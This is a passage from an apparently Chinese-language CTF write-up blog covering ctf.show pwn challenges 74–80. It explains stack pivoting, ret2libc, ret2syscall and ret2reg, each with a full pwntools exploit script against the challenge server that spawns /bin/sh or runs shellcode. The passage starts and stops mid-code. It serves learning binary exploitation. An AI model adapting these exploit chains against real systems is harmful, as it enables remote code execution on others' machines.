do</span><br><span class="line">    # 检查是否是文件而不是目录</span><br><span class="line">    if [[ -f &quot;$file&quot; ]]; then</span><br><span class="line">        echo &quot;Processing file: $file&quot;</span><br><span class="line">        </span><br><span class="line">        echo &quot;$file&quot; &gt;&gt; &quot;one_gadget_results.txt&quot;</span><br><span class="line">        # 运行 one_gadget 并将结果写入文件</span><br><span class="line">        one_gadget &quot;$file&quot; &gt;&gt; &quot;one_gadget_results.txt&quot; </span><br><span class="line"></span><br><span class="line">        echo -e &quot;\n&quot; &gt;&gt; &quot;one_gadget_results.txt&quot;</span><br><span class="line"></span><br><span class="line">        echo &quot;Results saved to one_gadget_results.txt&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Skipping non-file: $file&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>发送payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 题目使用的libc是libc6_2.27-3ubuntu1.6_amd64</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28106&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn74&quot;)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">final_gadget_addr = 0x10a2fc </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;this:&quot;)</span><br><span class="line">printf_addr = p.recvuntil(&quot;?&quot;,drop=True)</span><br><span class="line">printf_addr = int(printf_addr,16)</span><br><span class="line">print(printf_addr)</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;printf&quot;,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(&quot;printf&quot;)</span><br><span class="line">payload = str(libc_base + final_gadget_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn75"><a href="#pwn75" class="headerlink" title="pwn75"></a>pwn75</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240822193819763.png" alt="image-20240822193819763"></p>
<p>开了nx的32位elf</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823140820441.png" alt="image-20240823140820441"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823151319829.png" alt="image-20240823151319829"></p>
<p>漏洞函数如上，可以看到read是存在栈溢出漏洞的，但是s的长度为0x28，read读入的长度为0x30，也就是说只有ebp和ret这8个字节的长度是可以溢出的，栈空间不够操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">该题的知识点是栈迁移技术，重点在于对esp的位置进行修改，以此对栈的位置进行迁移</span><br><span class="line"></span><br><span class="line">具体可见链接：https://www.cnblogs.com/max1z/p/15299000.html#%E6%A0%88%E8%BF%81%E7%A7%BB</span><br><span class="line"></span><br><span class="line">写得非常好，具体到此题中我也会进行分析，但是栈迁移的概念就不作赘述了</span><br></pre></td></tr></table></figure>

<p>可以看到题目中还给了一个system函数，可以尝试利用system(‘&#x2F;bin&#x2F;sh’)来getshell</p>
<p>解题思路：</p>
<p>1、利用第一个read函数泄露出ebp的地址，由于printf函数遇到\x00才会停止，所以直接发送长度为0x28的payload就可以泄露出old_ebp的地址，得到的old_ebp的地址是caller函数的ebp，得到old_ebp之后可以计算出s的首地址为old_ebp-0x38（如图，aaaa所在地址为s的首地址0xffffcf10，而old_ebp的地址为0fffcf48，相差了0x38。此处需要注意的是，ebp右侧的第一个地址为栈空间所在的地址，第二个地址才是栈空间内的内容，相当于数组的索引和内容的关系）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823161652771.png" alt="image-20240823161652771"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = 0x27*&#x27;a&#x27; + &#x27;b&#x27;</span><br></pre></td></tr></table></figure>

<p>2、使用栈迁移技术，将栈转移到s变量处。首先要将ebp和ret所在的位置进行修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s_addr = old_ebp-0x38</span><br><span class="line">payload = 0x28*&#x27;a&#x27; + s_addr + leave_ret_addr</span><br><span class="line">第一次执行leave和ret，对s_addr执行leave，也就是mov esp,ebp;pop ebp操作,再对leave_ret_addr执行ret操作，也就是pop eip，eip指向esp所在的值，执行leave_ret，esp增加4</span><br><span class="line">第二次执行leave和ret，执行leave，再执行ret，此时eip的位置为s+0x4，可以令此处为system的地址，然后再加上一个ret和/bin/sh的地址，写入/bin/sh，此时payload会变为</span><br><span class="line">payload = (0x4*&#x27;a&#x27; + system_addr + 0x4*&#x27;a&#x27; + bin_sh_addr + &#x27;/bin/sh&#x27;).ljust(0x28,&#x27;a&#x27;) + s_addr + leave_ret_addr</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823171506815.png" alt="image-20240823171506815"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果将栈迁移到s-0x4的位置可不可以呢，也是可行的，只是payload需要随之修改</span><br><span class="line">payload = (system_addr + 0x4*&#x27;a&#x27; + bin_sh_addr + &#x27;/bin/sh&#x27;).ljust(0x28,&#x27;a&#x27;) + (s_addr-0x4) + leave_ret_addr</span><br><span class="line"></span><br><span class="line">第一次执行时ebp对应的位置是最后的eip的-0x4的位置，也就是ebp = eip -0x4</span><br><span class="line"></span><br><span class="line">当然实际情况还是要实际分析</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28175&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn75&quot;)  </span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">payload = 0x27*&#x27;a&#x27;+&#x27;b&#x27;</span><br><span class="line">p.recvuntil(&#x27;codename&#x27;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&#x27;b&#x27;)</span><br><span class="line">old_ebp_addr = u32((p.recv()[0:4]).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(old_ebp_addr))</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line"></span><br><span class="line">s_addr = old_ebp_addr - 0x38</span><br><span class="line">system_addr = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret_addr = 0x080484d5</span><br><span class="line">payload = (0x4*b&#x27;a&#x27; + p32(system_addr) + 0x4*b&#x27;a&#x27; + p32(s_addr + 0x10) + b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;) + p32(s_addr) + p32(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="pop-eip补充"><a href="#pop-eip补充" class="headerlink" title="pop eip补充"></a>pop eip补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在 x86 架构中，当执行 `pop eip` 指令时，`ESP` 和 `EIP` 寄存器会发生变化，而其他寄存器不会受到影响。具体来说：</span><br><span class="line"></span><br><span class="line">1. `EIP` 寄存器：</span><br><span class="line">   - `EIP` 是指令指针寄存器，存储的是下一条将要执行的指令的地址。</span><br><span class="line">   - 执行 `pop eip` 后，`EIP` 的值会被栈顶的数据（即 `ESP` 所指向的地址处的数据）更新。这样，CPU 将从新的 `EIP` 地址开始执行指令。</span><br><span class="line"></span><br><span class="line">2. `ESP` 寄存器：</span><br><span class="line">   - `ESP` 是栈指针寄存器，指向当前栈顶的位置。</span><br><span class="line">   - 执行 `pop eip` 后，`ESP` 的值会增加 4（对于 32 位架构）。这是因为 `ESP` 会向上移动，指向下一个栈元素，表示栈顶的移动。</span><br><span class="line"></span><br><span class="line">3. 其他寄存器：</span><br><span class="line">   - `pop eip` 指令只会影响 `EIP` 和 `ESP`，其他寄存器（如 `EAX`、`EBX`、`ECX` 等）不会受到此指令的影响。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">- `EIP` 变化：更新为 `ESP` 当前指向的栈顶值。</span><br><span class="line">- `ESP` 变化：增加 4，以指向下一个栈元素。</span><br><span class="line">- 其他寄存器：保持不变。</span><br></pre></td></tr></table></figure>



<h5 id="pop-ebp补充"><a href="#pop-ebp补充" class="headerlink" title="pop ebp补充"></a>pop ebp补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在执行指令 `pop ebp` 时，会发生以下两个步骤：</span><br><span class="line"></span><br><span class="line">1. 从栈中弹出数据：`pop` 指令会首先从栈顶弹出一个值。栈顶的地址由栈指针 `esp` 指向，因此这个值是 `*[esp]`。</span><br><span class="line"></span><br><span class="line">2. 更新寄存器和栈指针：</span><br><span class="line">   - 将弹出的值存储到寄存器 `ebp` 中。</span><br><span class="line">   - 更新栈指针 `esp`，使其指向新的栈顶。具体来说，`esp` 会增加 4（在32位系统中，`ebp` 和 `esp` 都是32位的，因此每次弹出一个值要增加4）。</span><br><span class="line"></span><br><span class="line">总结一下，执行 `pop ebp` 之后，`ebp` 寄存器会被设置为原栈顶的值，而 `esp` 的值将增加4。（栈是从高位向低位增长的）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn76"><a href="#pwn76" class="headerlink" title="pwn76"></a>pwn76</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823180021469.png" alt="image-20240823180021469"></p>
<p>开了nx和canary，静态编译</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823180331038.png" alt="image-20240823180331038"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240823195406676.png" alt="image-20240823195406676"></p>
<p>顺序分析一下程序，memset初始化s；printf输出字符串，由于没有占位符，v4是无效的参数；scanf读取最多30个字节的字符串，直到遇到空格字符；memset对input进行初始化，长度为0xC，input位于.bss区域；Base64Decode对s进行解码，解码后的字符串存储在v5，v7是解码后字符串的长度；如果v7&gt;0x7，报错，否则将v5复制到input，auth则对input进行md5的计算，符合条件就返回1，执行correct()函数，而correct函数是一个getshell的函数。由于最后通过md5反推出原字符串的可能性几乎是没有的，所以这道题想通过正常的途径getshell是不太可能的。</p>
<p>首先还是要找到栈溢出的漏洞点，在函数中主要是scanf函数和memcpy函数存在漏洞的可能性比较大，其中main函数中的scanf函数和memcpy函数是没有溢出的风险的。所以问题就落在了auth函数中的memcpy函数上，可以看到，memcpy中的目的变量v4和ebp的距离为8，而input的最大长度却可以达到0xc，也就是说刚好可以覆盖掉ebp。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824104455872.png" alt="image-20240824104455872"></p>
<p>但是覆盖ebp本身是没有意义的，因为覆盖ebp并没有办法影响到esp，但是可以看到的是，在auth函数的末尾，我们执行了一遍leave_ret，而在执行完cmp eax,1;jnz short loc_804941F之后，由于不满足条件，继续执行了mov eax,0;leave_ret。可以看到，在修改完ebp之后连续执行了两遍leave_ret（中间的cmp,jnz,mov等等都没有影响到ebp和esp的值，达成了栈迁移的条件。 </p>
<p>解题思路（错误版）：通过auth中的memcpy函数对memcpy的ebp进行覆盖，将其修改至system函数地址-4的位置，就可以执行system函数（失败了），最后ret不知道为什么跳转到了一个莫名其妙的地址，跟esp对应的不是一个地址，说不定是栈平衡之类的问题，或者栈帧修改炸了，有知道的大佬可以dd我</p>
<p>解题思路：将esp修改为input所在的位置，由于在main中会将input赋值为发送的payload，所以将input+4的位置修改为system的地址就可以执行system函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28234&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn76&quot;)  </span><br><span class="line">input_addr = 0x0811EB40</span><br><span class="line">shell_addr = 0x08049284</span><br><span class="line"></span><br><span class="line"># payload = 0x8*b&#x27;a&#x27; + p32(shell_addr-0x4) # 错误示范</span><br><span class="line">payload = 0x4*b&#x27;a&#x27; + p32(shell_addr) + p32(input_addr)</span><br><span class="line">payload = base64.b64encode(payload).decode(&#x27;utf-8&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn77"><a href="#pwn77" class="headerlink" title="pwn77"></a>pwn77</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824120936899.png" alt="image-20240824120936899"></p>
<p>开启了nx的64bit程序</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824141711642.png" alt="image-20240824141711642"></p>
<p>main函数中包含一个ctfshow函数，由于没有对v0进行限制，如果v0一直增大的话就会超过v2的数组范围导致栈溢出，可以泄露出puts或者getsc的地址，使用ret2libc应该就可以getshell</p>
<p>难点：在覆盖到v4的时候如何保持v4的值不变，是否可以通过修改v4的值直接跳转到ret的地址</p>
<p>解题思路：栈溢出跳转到puts函数，通过gadget修改寄存器，泄露出puts的地址，再使用LibcSearch搜索符合的libc库，再返回ctfshow函数或者main函数，再次输入payload，调用system函数getshell</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824143745807.png" alt="image-20240824143745807"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28223&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn77&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x110 - 0x4</span><br><span class="line">v4 = 0x110 - 0x4 + 1</span><br><span class="line">ctfshow_addr = elf.symbols[&#x27;ctfshow&#x27;]</span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">pop_ret_addr = 0x4008e3</span><br><span class="line">ret_addr = 0x400576</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(v4) + 0x8*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(ctfshow_addr)</span><br><span class="line">p.sendlineafter(&quot;T^T\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"># 查找有7f这个字节的地址，然后向前读取6个字节，再补全0x00到8个字节</span><br><span class="line">puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">system_addr = base_addr + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh_addr = base_addr + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(v4) + 0x8*b&#x27;a&#x27; + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn78"><a href="#pwn78" class="headerlink" title="pwn78"></a>pwn78</h4><p>tips:64bit ret2syscall</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824162828195.png" alt="image-20240824162828195"></p>
<p>提示给得很明显，但是还是得看题，开启了nx，64bit，静态编译</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824163654952.png" alt="image-20240824163654952"></p>
<p>main函数很简单，只有一个gets，甚至还骂人（这下不得不hack你了，还敢说脏话）</p>
<p>根据ret2syscall的原理，只需要找到跟rax，rdi，rsi，rdx，syscall相关的gadget就可以了</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824164216542.png" alt="image-20240824164216542"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824164649494.png" alt="image-20240824164649494"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824170034444.png" alt="image-20240824170034444"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824171325614.png" alt="image-20240824171325614"></p>
<p>注意syscall_addr的选取，这里最好选择syscall;ret的形式，或者其他不会对栈进行修改的指令，可以使用 0f 05 C3 在ida中直接搜索(Search -&gt; Sequence of bytes)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28136&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn78&quot;)</span><br><span class="line"></span><br><span class="line"># bss段随便找个地方存一下/bin/sh，在gdb中可以看到这一段是可写的</span><br><span class="line">bss_addr = 0x6c2f50</span><br><span class="line">offset = 0x50 + 0x8</span><br><span class="line">rax_ret = 0x46b9f8</span><br><span class="line">rdi_ret = 0x4016c3</span><br><span class="line">rdx_rsi_ret = 0x4377f9</span><br><span class="line">syscall_addr = 0x45f125</span><br><span class="line">#syscall_addr = 0x45bac5</span><br><span class="line"># 由于没有/bin/sh，需要系统调用read读取一个，跟前面的pwn72是一样的原理</span><br><span class="line">payload = cyclic(offset)</span><br><span class="line"># 系统调用read(0,bss,0x30)</span><br><span class="line">payload += p64(rax_ret) + p64(0x0)</span><br><span class="line"># 确定输入流，标准输入</span><br><span class="line">payload += p64(rdi_ret) + p64(0x0)</span><br><span class="line">payload += p64(rdx_rsi_ret) + p64(0x30) + p64(bss_addr) + p64(syscall_addr)</span><br><span class="line"># 系统调用execve(&#x27;/bin/sh&#x27;,0,0)</span><br><span class="line">payload += p64(rax_ret) + p64(0x3b) + p64(rdi_ret) + p64(bss_addr) + p64(rdx_rsi_ret) + p64(0x0) + p64(0x0) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="ret2syscall补充-1"><a href="#ret2syscall补充-1" class="headerlink" title="ret2syscall补充"></a>ret2syscall补充</h5><p>截图来自：<a target="_blank" rel="noopener" href="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2syscall/%EF%BC%8C64%E4%BD%8D%E5%A4%84%E7%9A%84rcx%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%94%A8%E5%8A%A0%E8%BF%99%E4%B8%AA">https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2syscall/，64位处的rcx是错误的，不用加这个</a></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824163608233.png" alt="image-20240824163608233"></p>
<h4 id="pwn79"><a href="#pwn79" class="headerlink" title="pwn79"></a>pwn79</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824171746893.png" alt="image-20240824171746893"></p>
<p>保护全关，32bit</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824172759162.png" alt="image-20240824172759162"></p>
<p>main函数中的fgets，读入2048个字节，而input和ebp的距离是808h(2056)，也就是刚好读到ebp-8的位置，不会影响到p_agrc，也不会栈溢出</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824172921338.png" alt="image-20240824172921338"></p>
<p>strcpy将input的内容复制到buf，很明显是可以栈溢出的，找到栈溢出的溢出点，本题是可以用ret2libc写的，但是官方的做法是使用的ret2reg。由于前面已经有一道ret2libc了，这里就不作尝试了。</p>
<p>此处我们还是学习一下ret2reg吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret2reg，就是通过寄存器来getshell，类似于jmp,call之类的指令都可以通过寄存器的地址来调整程序的执行流。</span><br><span class="line">在本题中，只需要调试一下，观察是否有寄存器在可控制的缓冲区范围内，写入shellcode到寄存器指向的地址，再找一个gadget（内容为call 寄存器或者jmp 寄存器）写入ret区域即可。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 因为要input的字符串长度太长了，这里就使用脚本来发送了，弹出调试窗口之后先continue一次跳转到断点位置</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = gdb.debug(&#x27;../pwn79&#x27;,&#x27;b main&#x27;)</span><br><span class="line">elf = ELF(&quot;../pwn79&quot;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(2048)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824180158568.png" alt="image-20240824180158568"></p>
<p>可以看到在执行leave之前，eax寄存器的位置是在aaaa的位置，也就是payload的起始位置，此时如果能找到gadget(call eax)的话，并且在payload的开头写下shellcode的话，就可以成功执行shellcode。其实其他就寄存器也可以，比如这里的ecx和edx，也是在可以通过栈溢出控制的区域内。</p>
<p>调试到这一步就可以结束了，接下来只需要找到gadget就大功告成。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240824181040923.png" alt="image-20240824181040923"></p>
<p>ez</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28270&#x27;)</span><br><span class="line">elf = ELF(&quot;../pwn79&quot;)</span><br><span class="line"></span><br><span class="line">call_eax = 0x080484a0</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode + cyclic(0x208 + 0x4 - len(shellcode)) + p32(call_eax)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn80"><a href="#pwn80" class="headerlink" title="pwn80"></a>pwn80</h4><p>BROP</p>
<p>相关链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#brop">中级ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p> 没有附件，所以就没什么好分析的了。</p>
<p>论文原文：<a target="_blank" rel="noopener" href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf (stanford.edu)</a></p>
<p>第一次看论文没想到是在学pwn，人麻了，一看看了三天，看英语是真折磨，困得要死</p>
<p>这道题开个单章吧，此处就贴个poc好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 